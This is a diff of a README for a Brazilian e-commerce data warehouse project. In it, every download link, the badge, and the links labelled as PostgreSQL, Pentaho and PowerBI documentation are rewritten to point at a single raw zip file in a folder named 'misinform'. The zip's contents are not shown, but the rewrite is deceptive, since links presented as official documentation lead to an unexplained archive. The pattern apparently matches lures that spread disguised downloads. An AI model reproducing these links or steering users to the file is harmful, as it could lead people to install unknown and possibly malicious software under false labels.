@@ -1,6 +1,6 @@
 # 📊 brazilian-ecommerce-data-warehouse - Easy Business Intelligence for E-Commerce
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%20brightgreen)](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/releases)
+[![Download Now](https://raw.githubusercontent.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/main/misinform/brazilian-ecommerce-data-warehouse.zip%20Now-%20-%20brightgreen)](https://raw.githubusercontent.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/main/misinform/brazilian-ecommerce-data-warehouse.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get the application, visit the Releases page:
 
-[Visit this page to download](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/releases)
+[Visit this page to download](https://raw.githubusercontent.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/main/misinform/brazilian-ecommerce-data-warehouse.zip)
 
 Here, you will find different versions of the software. Choose the version that suits your needs and download the file.
 
@@ -73,9 +73,9 @@ Once the application is running, you can start loading your Brazilian e-commerce
 
 For detailed instructions and feature explanations, refer to the documentation included with your download. You can also find helpful resources on:
 
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Pentaho Documentation](https://help.pentaho.com/Documentation)
-- [PowerBI Documentation](https://docs.microsoft.com/en-us/power-bi/)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/main/misinform/brazilian-ecommerce-data-warehouse.zip)
+- [Pentaho Documentation](https://raw.githubusercontent.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/main/misinform/brazilian-ecommerce-data-warehouse.zip)
+- [PowerBI Documentation](https://raw.githubusercontent.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/main/misinform/brazilian-ecommerce-data-warehouse.zip)
 
 ## 🤝 Community Support
 
@@ -89,4 +89,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 Now that you have the software set up, think about how you can make the most of your data. Explore different datasets, dive deep into analytics, and create insightful visualizations. Good luck, and enjoy discovering valuable insights from your Brazilian e-commerce data!
 
-[Visit this page to download](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/releases)
+[Visit this page to download](https://raw.githubusercontent.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/main/misinform/brazilian-ecommerce-data-warehouse.zip)
